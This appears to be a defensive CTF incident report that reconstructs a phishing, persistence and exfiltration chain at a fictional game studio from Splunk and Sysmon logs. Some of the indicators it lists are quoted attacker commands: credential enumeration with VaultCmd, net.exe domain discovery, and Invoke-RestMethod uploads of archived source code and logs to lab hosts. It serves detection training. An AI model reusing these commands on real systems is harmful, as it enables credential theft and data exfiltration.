# 🚨 Incident Report: Repossessed (Initial Access & Lateral Movement)

**Analyst:** mlwrdtctd  
**Date of Activity:** October 23, 2026  
**Severity:** Critical  
**Platform:** TryHackMe (CTF-Event)  
**Environment:** TryHatMe Studios (NeuralNexus Game Development)

---

## 📋 Executive Summary
On October 23, 2026, a multi-stage cyberattack was detected targeting TryHatMe Studios. 
The initial access was achieved via a phishing document (`Q3_PressKit_Feedback.docm`) opened by the compromised user `m.smith`. 
The attacker leveraged macro execution to spawn a hidden, Base64-encoded PowerShell process, which downloaded a second-stage payload and established Command and Control (C2) communication. 
The attacker subsequently performed credential harvesting, domain discovery, and established persistence via a malicious Windows Service and a Scheduled Task. 
Finally, the attacker moved laterally to a development server (`THM-SREYES`) and exfiltrated both the unreleased game source code ("NeuralNexus") and sensitive crash logs.

---

## 🔍 Kill Chain (Attack Timeline)

### 1. Initial Access (Phishing)
*   **Timestamp:** `2026-10-23 12:02:44`
*   **Event:** Compromised user `m.smith` opened a macro-enabled document from the `Downloads` folder.
*   **Process Chain:** `explorer.exe` -> `WINWORD.EXE` -> `powershell.exe`
*   **IOC:** `C:\Users\m.smith\Downloads\Q3_PressKit_Feedback.docm`

![WINWORD.EXE executing the malicious document](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/1_winword_execution.png)

### 2. Execution & Defense Evasion
*   **Timestamp:** `2026-10-23 12:02:44`
*   **Event:** Word spawned a hidden PowerShell process (`ProcessId: 8572`). The command line used Base64 encoding (`-Enc`) and hidden flags (`-NoP -W Hidden`) to evade detection.
*   **Decoded Payload:** The Base64 string revealed a download-and-execute stager pulling `svchost_update.ps1` from the malicious domain `paylink-cdn.thm`.
*   **IOC:** `powershell.exe -NoP -W Hidden -Enc [Base64 String]`

![PowerShell execution with encoded command](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/2_payload_execution.png)

### 3. Command and Control (C2)
*   **Timestamp:** `2026-10-23 12:02:47`
*   **Event:** PowerShell established outbound connections to the C2 server - IP `45.147.230.131`. This IP is marked as malicious in VirusTotal.
*   **IOC:** IP `45.147.230.131`, Port `8067`, Domain `paylink-cdn.thm`

### 4. Credential Access
*   **Timestamp:** `2026-10-23 12:02:48`
*   **Event:** The attacker used the legitimate Windows utility `VaultCmd.exe` to enumerate stored credentials from the Windows Credential Manager. This was done to obtain credentials for lateral movement.
*   **IOC:** `"C:\Windows\Sysnative\vaultcmd.exe" "/listcreds:Windows Credentials"`

![VaultCmd credential enumeration](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/4_Credential%20Access.png)

### 5. Discovery (Network Enumeration)
*   **Timestamp:** `2026-10-23 12:07:48`
*   **Event:** The attacker executed multiple `net.exe` commands to map the Active Directory environment:
    *   `net.exe user /domain` (Enumerate domain users)
    *   `net.exe group "Domain Admins" /domain` (Identify high-value targets)
    *   `net.exe use \\THM-SREYES\C$` (Attempt lateral movement to an admin share)
*   **IOC:** `net.exe` commands targeting `THM-SREYES`.

![Net group Domain Admins enumeration](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/5_discovery_Domain%20Admins.png)
![Net use admin share C$](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/5_discovery_THM-SREYES_C%24.png)
![Net user domain enumeration](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/5_discovery_domain.png)

### 6. Persistence (Service Creation & Scheduled Task)
*   **Timestamp:** `2026-10-23 12:10:18` (Service) & `12:17:41` (Scheduled Task)
*   **Event:** The attacker established persistence using two methods:
    1.  **Windows Service:** Created a service named `SvcUpdate` (running as `LocalSystem`) to execute `svchost_update.ps1` on startup.
    2.  **Scheduled Task:** A malicious Scheduled Task (`svchost.exe -k netsvcs -p -s Schedule`) was used to periodically spawn a malicious PowerShell process (`PID 12408`) for data exfiltration.
*   **IOC:** 
    *   Service Name: `SvcUpdate`
    *   Service File: `C:\Windows\Temp\svchost_update.ps1`
    *   Compromised Account (used to create service): `svc-mktshare` (Logon ID: `0x24F6572`)

![Windows Service Creation for Persistence](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/6_Persistence.png)

### 7. Data Staging & Exfiltration (Game Source Code)
*   **Timestamp:** `2026-10-23 09:07:27`
*   **Event:** The attacker used the legitimate `7z.exe` utility (launched by PowerShell `PID 14264`) to compress the game's source code (`C:\Dev\NeuralNexus\Build\*`) into an archive named `nx_build_beta.7z`. The archive was then exfiltrated via PowerShell.
*   **IOC:** 
    *   Archive: `C:\Windows\Temp\nx_build_beta.7z`
    *   Targeted Path: `C:\Dev\NeuralNexus\Build\*`
    *   Command Line (Archiving): `"C:\Program Files\7-Zip\7z.exe" a -mx=1 C:\Windows\Temp\nx_build_beta.7z C:\Dev\NeuralNexus\Build\*`
    *   Command Line (Exfiltration): `Invoke-RestMethod -Uri http://paylink-cdn.thm:8067/upload -Method Post -InFile C:\Windows\Temp\nx_build_beta.7z`
    *   Exfiltration URL: `http://paylink-cdn.thm:8067/upload`
    *   Destination IP: `45.147.230.131`

### 7.2 Data Staging & Exfiltration (Crash Logs)
*   **Timestamp:** `2026-10-23 12:17:41`
*   **Event:** In a parallel activity, the Scheduled Task spawned a PowerShell process (`PID 12408`). It compressed log files (`C:\ProgramData\CrashReports\*.log`) into `crashlogs.7z` using `7z.exe` and exfiltrated them via `Invoke-RestMethod`.
*   **IOC:** 
    *   Archive: `C:\ProgramData\CrashReports\crashlogs.7z`
    *   Process ID: `12408` (`powershell.exe`)
    *   Parent Process: `svchost.exe` (Scheduled Task)
    *   Command Line: `"powershell.exe" -NoProfile -WindowStyle Hidden -Command "& "7z.exe" a "C:\ProgramData\CrashReports\crashlogs.7z" "C:\ProgramData\CrashReports\*.log"; Invoke-RestMethod -Uri "https://telemetry-vendor.thm/upload" ..."`
    *   Exfiltration URL: `https://telemetry-vendor.thm/upload`
    *   Destination IP: `104.18.32.47`

![Crash logs exfiltration via Invoke-RestMethod](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/7_Crash%20Logs.png)
![Data staging of the game source code](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/7_Data%20Staging.png)
![Exfiltration of the game source code archive](https://raw.githubusercontent.com/mlwrdtctd/ctf-soc-writeups/fd220470022f2217c7139c94e0e6266f67d4e294/01_Incident_Response_Reports/7_game%20source%20code.png)

---

## 🚩 MITRE ATT&CK Mapping
| Tactic | Technique | ID |
| :--- | :--- | :--- |
| Initial Access | Phishing: Spearphishing Attachment | T1566.001 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Credential Access | Credentials from Password Stores: Windows Credential Manager | T1555.004 |
| Discovery | Account Discovery: Domain Account | T1087.002 |
| Discovery | Network Share Discovery | T1135 |
| Persistence | Create or Modify System Process: Windows Service | T1543.003 |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 |
| Exfiltration | Exfiltration Over C2 Channel | T1041 |

---

## 🛡️ Recommendations

### Containment
*   Immediately isolate the affected hosts (`THM-MSMITH` and `THM-SREYES`) from the network via EDR.

### Eradication
*   Delete the malicious script `svchost_update.ps1`.
*   Remove the `SvcUpdate` Windows Service.
*   Delete the malicious Scheduled Task that spawns the hidden PowerShell process.
*   Block the malicious IPs `45.147.230.131` and `104.18.32.47`, and domains `paylink-cdn.thm` and `telemetry-vendor.thm` at the perimeter firewall and proxy.

### Recovery & Prevention
*   Reset passwords for compromised accounts (`m.smith` and `svc-mktshare`).
*   Enforce Group Policy (GPO) to block macros in Office documents downloaded from the Internet.
*   Restrict the execution of `vaultcmd.exe` and `net.exe` for non-administrative users where possible.

---

## 📝 Key Splunk Queries Used
```spl
# 1. Detect Base64 encoded PowerShell (Execution)
index=* EventCode=1 Image="*powershell.exe" CommandLine="*-Enc*"

# 2. Identify C2 Communication (Command and Control)
index=* DestinationIp="45.147.230.131" | stats count by ProcessId, Image

# 3. Detect Service Creation for Persistence
index=* EventCode=4697 Service_Name="SvcUpdate"

# 4. Hunt for Lateral Movement via Net.exe
index=* EventCode=1 Image="*net.exe" CommandLine="*use*\\\\THM-SREYES*"

# 5. Detect Parallel Exfiltration Process
index=* ProcessId="12408" | table _time, Image, CommandLine
```

---

## 🛠️ Tools & Technologies Used

### Defensive Tools (Analyst Side)
*   **SIEM:** Splunk (SPL queries for event correlation and pivoting).
*   **Logging:** Sysmon (Event IDs 1, 3, 11, 13, 22), Windows Security Event Logs (Event IDs 4697, 4624).
*   **Threat Intelligence:** VirusTotal (IP reputation check).
*   **Analysis:** Base64 decoding (manual/PowerShell).

### Offensive Tools (Adversary Side - Observed in Logs)
*   **Execution:** PowerShell (`powershell.exe`), `cmd.exe`.
*   **C2 / Exfiltration:** Custom C2 servers (`45.147.230.131`, `104.18.32.47`), `7z.exe` (archiving), `Invoke-RestMethod` (uploading).
*   **Discovery:** `net.exe`, `net1.exe`.
*   **Credential Access:** `VaultCmd.exe` (Living off the Land).
*   **Persistence:** `sc.exe` (Service Creation), `svchost.exe` (Scheduled Task).

### Frameworks
*   MITRE ATT&CK Framework (for mapping TTPs).
